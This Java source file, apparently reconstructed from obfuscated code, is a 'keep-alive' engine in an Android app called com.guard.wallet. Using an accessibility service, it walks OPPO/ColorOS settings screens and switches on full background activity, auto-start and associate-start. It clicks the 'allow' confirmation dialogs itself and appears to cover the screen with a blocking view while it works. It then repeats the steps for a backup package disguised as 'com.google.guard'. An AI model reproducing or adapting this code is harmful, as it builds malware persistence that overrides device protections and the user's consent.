package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * OPPO/Realme/OnePlus 保活引擎。
 *
 * 处理 OPPO ColorOS 保活:
 * - 应用详情 -> 电池管理 -> 电源控制
 * - 切换: 自启动、关联启动、完全后台
 * - 启动应用列表管理
 *
 * ListenWindows: com.oplus.battery, com.coloros.oppoguardelf, com.android.settings
 *
 * vendor 原始路径: o/v.java
 */
public final class OppoEngine extends KeepAliveEngine {

    public static final int v = 0;

    // ADAPT: cache enum values to avoid r.e.X (field 'r' shadows class o.r)
    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    /** KeepAlive state: UNKNOWN -> MAIN_APP -> BACKUP_APP */
    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);

    /** Full background allowed */
    public final AtomicBoolean s = new AtomicBoolean(false);
    /** Auto-start allowed */
    public final AtomicBoolean t = new AtomicBoolean(false);
    /** Associate-start allowed */
    public final AtomicBoolean u = new AtomicBoolean(false);

    public OppoEngine() {
        super(buildAllListenWindows(), "com.android.settings");
        try {
            this.p.schedule(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 4), 100L, TimeUnit.SECONDS);
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
    }

    // ======= Static ListenWindow builders =======

    /** ListenWindow: com.android.settings / InstalledAppDetailsTop (with app name match) */
    /** vendor 原名: A0(String) */
    public static ListenWindow buildAppDetailListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** ListenWindow: com.android.settings / FrameLayout (with app name match) */
    /** vendor 原名: v0(String) */
    public static ListenWindow buildFrameLayoutListenWindow(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** ListenWindow: com.oplus.battery / PowerControlActivity */
    /** vendor 原名: y0() */
    public static ListenWindow buildPowerControlListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerControlActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** ListenWindow: com.oplus.battery / FrameLayout (background text match) */
    /** vendor 原名: x0() */
    public static ListenWindow buildBatteryFrameLayoutListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildBackgroundTextFilter());
        return lw;
    }

    /** ListenWindow: com.oplus.battery / StartupAppListActivity */
    /** vendor 原名: z0() */
    public static ListenWindow buildStartupListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery",
                "com.oplus.startupapp.view.StartupAppListActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** ListenWindow: com.coloros.oppoguardelf / PowerControlActivity */
    /** vendor 原名: q0() */
    public static ListenWindow buildGuardElfPowerControlListenWindow() {
        ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerControlActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** ListenWindow: com.oplus.battery / appcompat dialog (with allow button match) */
    /** vendor 原名: g0() */
    public static ListenWindow buildAndroidXDialogListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery", "androidx.appcompat.app.b");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildAllowConfirmFilter());
        return lw;
    }

    /** ListenWindow: com.oplus.battery / null (with allow button match) */
    /** vendor 原名: h0() */
    public static ListenWindow buildBatteryNullClassListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery", null);
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildAllowConfirmFilter());
        return lw;
    }

    /** ListenWindow: com.oplus.battery / COUI appcompat dialog (with allow button match) */
    /** vendor 原名: n0() */
    public static ListenWindow buildCouiDialogListenWindow() {
        ListenWindow lw = new ListenWindow("com.oplus.battery", "com.coui.appcompat.dialog.app.a");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildAllowConfirmFilter());
        return lw;
    }

    /** ListenWindow: com.coloros.oppoguardelf / null (with allow button match) */
    /** vendor 原名: o0() */
    public static ListenWindow buildGuardElfNullListenWindow() {
        ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf", null);
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildAllowConfirmFilter());
        return lw;
    }

    /** ListenWindow: com.coloros.oppoguardelf / FrameLayout (with background text match) */
    /** vendor 原名: p0() */
    public static ListenWindow buildGuardElfFrameLayoutListenWindow() {
        ListenWindow lw = new ListenWindow("com.coloros.oppoguardelf", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(buildBackgroundTextFilter());
        return lw;
    }

    /** Build full ListenWindow list for OPPO engine */
    /** vendor 原名: w0() — Build full ListenWindow list for OPPO engine */
    public static LinkedList buildAllListenWindows() {
        LinkedList list = new LinkedList();
        list.add(EngineHelper.cJ());
        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.e()));
        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.e()));
        list.add(buildPowerControlListenWindow());
        list.add(buildGuardElfPowerControlListenWindow());
        list.add(buildAndroidXDialogListenWindow());
        list.add(buildCouiDialogListenWindow());
        list.add(buildBatteryNullClassListenWindow());
        list.add(buildGuardElfNullListenWindow());
        list.add(buildStartupListenWindow());
        return list;
    }

    // ======= Static CombineFilter builders =======

    /** vendor 原名: buildAllowConfirmFilter() — Filter: Button text = COLORS_SETTINGS_ALLOW_BUTTON_TEXT (allow confirm button) */
    public static CombineFilter buildAllowConfirmFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.Button"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_ALLOW_BUTTON_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: b0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT */
    public static CombineFilter buildAllowBackgroundFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: c0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT */
    public static CombineFilter buildAutoStartTextFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: e0() — Filter: TextView text = COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT */
    public static CombineFilter buildFullBackgroundFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: f0() — Filter: TextView text contains COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT */
    public static CombineFilter buildRelateStartFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: buildBackgroundTextFilter() — Filter: TextView text contains COLORS_APP_IN_BACKGROUND_TEXT */
    public static CombineFilter buildBackgroundTextFilter() {
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_APP_IN_BACKGROUND_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: B0() — Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_TEXT (may return null) */
    public static CombineFilter buildPowerManageFilter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** vendor 原名: C0() — Filter: TextView text = COLORS_SETTINGS_POWER_MANAGE_2_TEXT (may return null) */
    public static CombineFilter buildPowerManage2Filter() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_2_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COLORS_SETTINGS_POWER_MANAGE_2_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    // ======= Window detection helpers =======

    /** vendor 原名: j0() — Check if in allow-confirm dialog (multiple window types) */
    public final boolean isInAllowConfirmDialog() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildAndroidXDialogListenWindow());
            list.add(buildCouiDialogListenWindow());
            list.add(buildBatteryNullClassListenWindow());
            list.add(buildGuardElfNullListenWindow());
            if (this.q(list)) {
                Log.e("o.v", "已进入是否完全允许对话框");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
        return false;
    }

    /** vendor 原名: k0() — Check if in app detail window (InstalledAppDetailsTop or FrameLayout with app name) */
    public final boolean isInAppDetailWindow() {
        try {
            String appName = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                    ? com.guard.wallet.utils.SystemHelper.x0() : com.guard.wallet.utils.SystemHelper.e();
            LinkedList list = new LinkedList();
            list.add(buildAppDetailListenWindow(appName));
            list.add(buildFrameLayoutListenWindow(appName));
            if (this.q(list)) {
                Log.e("o.v", "已进入App详情窗口");
                return true;
            }
            return false;
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
            return false;
        }
    }

    /** vendor 原名: l0() — Check if in power control / battery management window */
    public final boolean isInPowerControlWindow() {
        try {
            LinkedList list = new LinkedList();
            list.add(buildPowerControlListenWindow());
            list.add(buildBatteryFrameLayoutListenWindow());
            list.add(buildGuardElfPowerControlListenWindow());
            list.add(buildGuardElfFrameLayoutListenWindow());
            if (this.q(list)) {
                Log.e("o.v", "已进入App耗电管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
        return false;
    }

    /** vendor 原名: m0() — Check if in startup app list window */
    public final boolean isInStartupWindow() {
        try {
            if (this.q(Collections.singletonList(buildStartupListenWindow()))) {
                Log.e("o.v", "已进入自启动管理窗口");
                return true;
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
        return false;
    }

    // ======= Toggle helpers =======

    /**
     * Toggle "full background" switch. Returns true if checked.
     *
     * ADAPT: ColorOS 16 已将 Switch 改为 RadioButton 单选模式。
     * 参考 android 项目 OppoEngine.handleFullBackgroundSwitch():
     *   1. 先尝试 vendor 原始 Switch 模式 (toggleSwitchWithRetry() 坐标点击)
     *   2. Switch 未找到时 fallback 到 RadioButton 模式 (直接点击行)
     */
    /** vendor 原名: r0() */
    public final boolean toggleFullBackground() {
        try {
            CombineFilterWithChild filter1 = new CombineFilterWithChild(EngineHelper.cK(), buildFullBackgroundFilter());
            UiObject found = this.k().findOneByCombineWithChild(filter1);
            if (found == null) {
                CombineFilterWithChild filter2 = new CombineFilterWithChild(EngineHelper.cK(), buildAllowBackgroundFilter());
                found = this.k().findOneByCombineWithChild(filter2);
            }

            if (found == null) {
                Log.e("o.v", "完全允许后台行为栏目查找失败");
                return false;
            }

            Log.e("o.v", "完全允许后台行为栏目查找成功");

            // ====== 尝试 1: Switch 模式 (旧版 ColorOS) ======
            CheckedResult result = this.toggleSwitchWithRetry(found, 0);
            if (result.isClicked()) {
                Log.e("o.v", "已点击完全允许后台行为 (Switch 模式)");
            }
            if (result.isChecked()) {
                Log.e("o.v", "已勾选完全允许后台行为 (Switch 模式)");
                com.guard.wallet.utils.SystemHelper.T0(10);
                if (!isInAllowConfirmDialog()) {
                    this.s.set(true);
                    return true;
                }
                return false;
            }

            // ====== 尝试 2: RadioButton 模式 (ColorOS 16) ======
            // 参考 android 项目 handleFullBackgroundSwitch(): 直接点击行 + 自行处理对话框
            Log.e("o.v", "Switch 未找到，尝试 RadioButton 模式");
            found.click();
            com.guard.wallet.utils.SystemHelper.T0(20);
            this.G();

            UiObject dialogRoot = this.k();
            if (dialogRoot != null) {
                // 检查是否弹出确认对话框 → 自行点击"允许"按钮
                // 优先用 android:id/button1 (标准 AlertDialog 确认按钮)
                UiObject allowBtn = dialogRoot.findOneById("android:id/button1");
                if (allowBtn != null && allowBtn.click()) {
                    Log.e("o.v", "RadioButton 模式: 已点击确认对话框 (android:id/button1)");
                    com.guard.wallet.utils.SystemHelper.T0(10);
                    this.s.set(true);
                    return true;
                }
                // fallback: 用 COLORS_SETTINGS_ALLOW_BUTTON_TEXT 文本匹配
                CombineFilter btnFilter = buildAllowConfirmFilter();
                if (btnFilter != null) {
                    UiObject textBtn = dialogRoot.findOneByCombine(btnFilter);
                    if (textBtn != null && textBtn.click()) {
                        Log.e("o.v", "RadioButton 模式: 已点击确认对话框 (文本匹配)");
                        com.guard.wallet.utils.SystemHelper.T0(10);
                        this.s.set(true);
                        return true;
                    }
                }
            }

            // 无对话框 = RadioButton 直接选中 (某些 ColorOS 16 版本行为)
            Log.e("o.v", "RadioButton 模式: 无对话框，假设直接选中成功");
            this.s.set(true);
            return true;
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
            return false;
        }
    }

    /** vendor 原名: s0() — Toggle "auto-start" switch. Returns true if checked. */
    public final boolean toggleAutoStart() {
        try {
            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), buildAutoStartTextFilter());
            UiObject found = this.k().findOneByCombineWithChild(filter);
            if (found != null) {
                Log.e("o.v", "自启动栏目查找成功");
                CheckedResult result = this.toggleSwitchWithRetry(found, 5);
                if (result.isClicked()) {
                    Log.e("o.v", "已点击允许自启动");
                }
                boolean isChecked = result.isChecked();
                AtomicBoolean autoStart = this.t;
                if (isChecked) {
                    Log.e("o.v", "已勾选允许自启动");
                    autoStart.set(true);
                    return true;
                }
                Log.e("o.v", "未勾选允许自启动");
                autoStart.set(false);
            } else {
                Log.e("o.v", "允许自启动栏目查找失败");
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
        return false;
    }

    /** vendor 原名: t0() — Toggle "associate-start" switch. Returns true if checked. */
    public final boolean toggleRelateStart() {
        try {
            CombineFilterWithChild filter = new CombineFilterWithChild(EngineHelper.cK(), buildRelateStartFilter());
            UiObject found = this.k().findOneByCombineWithChild(filter);
            String errMsg;
            if (found != null) {
                Log.e("o.v", "关联启动栏目查找成功");
                CheckedResult result = this.toggleSwitchWithRetry(found, 5);
                if (result.isClicked()) {
                    Log.e("o.v", "已点击允许关联启动");
                }
                if (result.isChecked()) {
                    Log.e("o.v", "已勾选允许关联启动");
                    this.u.set(true);
                    return true;
                }
                errMsg = "未勾选允许关联启动";
            } else {
                errMsg = "关联启动栏目查找失败";
            }
            Log.e("o.v", errMsg);
            return false;
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
            return false;
        }
    }

    // ======= Strategy save & next-app logic =======

    /** vendor 原名: savePowerControlState(String) — Save keep-alive strategy for given package */
    public final void savePowerControlState(String pkg) {
        try {
            PowerControlStateVO state = com.guard.wallet.utils.SharedPrefsManager.k(pkg);
            state.setPackageName(pkg);
            if (this.s.get()) {
                state.setAllowAllFullBackground(this.s.get());
            }
            if (this.t.get()) {
                state.setAllowAutoStart(this.t.get());
            }
            if (this.u.get()) {
                state.setAllowRelateStart(this.u.get());
            }
            state.setRetryCount(state.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(state);
            Log.e("o.v", pkg.concat(" 进程保活策略已保存"));
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
    }

    /**
     * u0() — after power control toggles succeed, save strategy and possibly
     * launch backup app's detail page for the same operation.
     */
    public final void u0() {
        AtomicBoolean bgFlag = this.s;
        try {
            if (!bgFlag.get()) {
                return;
            }
            AtomicReference stateRef = this.r;
            boolean isMainApp = Objects.equals(stateRef.get(), KEEP_ALIVE_MAIN);
            Object backupEnum = KEEP_ALIVE_BACKUP;

            if (isMainApp) {
                savePowerControlState(MainApplication.getAppContext().getPackageName());
                this.n.clear();
                bgFlag.set(false);
                this.t.set(false);
                this.u.set(false);
                if (!com.guard.wallet.utils.SharedPrefsManager.r("com.google.guard")
                        && com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                    stateRef.set(backupEnum);
                    com.guard.wallet.utils.SystemHelper.Z0("com.google.guard");
                    Log.e("o.v", "已启动 ".concat("com.google.guard").concat(" 应用详情"));
                    return;
                }
                Z();
            } else if (Objects.equals(stateRef.get(), backupEnum)) {
                savePowerControlState("com.google.guard");
                Z();
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
    }

    // ======= Engine lifecycle =======

    @Override
    public final void Z() {
        ReentrantLock lock = this.o;
        if (lock.tryLock()) {
            try {
                if (!isEngineFinished()) {
                    Log.e("o.v", "准备结束本地保活自动化引擎");
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    markEngineRunning();
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    AtomicReference stateRef = this.r;
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_MAIN)) {
                        savePowerControlState(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_BACKUP)) {
                        savePowerControlState("com.google.guard");
                    }
                    this.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                    this.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    if (!EngineHelper.heS().isPaired() && Objects.equals(0, com.guard.wallet.utils.ConfigManager.getPromotionModel())) {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                    } else {
                        EngineHelper.callEBD();
                        com.guard.wallet.helper.BlockViewManager.c();
                    }
                    Log.e("o.v", "已结束本地保活自动化引擎");
                    EngineHelper.cW();
                    this.d();
                }
            } catch (Exception ex) {
                AppUtils.s("o.v", ex);
            }
            lock.unlock();
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        try {
            if (isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, packageName, className);
            }
            boolean inAppDetail = isInAppDetailWindow();
            String delegateId = this.c;
            ConcurrentLinkedQueue queue = this.n;

            if (inAppDetail) {
                queue.remove("keepAliveInPowerControl");
                queue.remove("keepAliveInAndroidXDialog");
                queue.remove("keepAliveInStartup");
                if (!queue.contains("keepAliveInAppDetail")) {
                    queue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 0), delegateId);
                }
            }
            if (isInPowerControlWindow()) {
                queue.remove("keepAliveInAppDetail");
                queue.remove("keepAliveInAndroidXDialog");
                queue.remove("keepAliveInStartup");
                if (!queue.contains("keepAliveInPowerControl")) {
                    queue.add("keepAliveInPowerControl");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 1), delegateId);
                }
            }
            if (isInAllowConfirmDialog()) {
                queue.remove("keepAliveInAppDetail");
                queue.remove("keepAliveInPowerControl");
                queue.remove("keepAliveInStartup");
                if (!queue.contains("keepAliveInAndroidXDialog")) {
                    queue.add("keepAliveInAndroidXDialog");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 2), delegateId);
                }
            }
            if (isInStartupWindow()) {
                queue.remove("keepAliveInAppDetail");
                queue.remove("keepAliveInPowerControl");
                queue.remove("keepAliveInAndroidXDialog");
                if (!queue.contains("keepAliveInStartup")) {
                    queue.add("keepAliveInStartup");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 3), delegateId);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("o.v", ex);
        }
    }
}
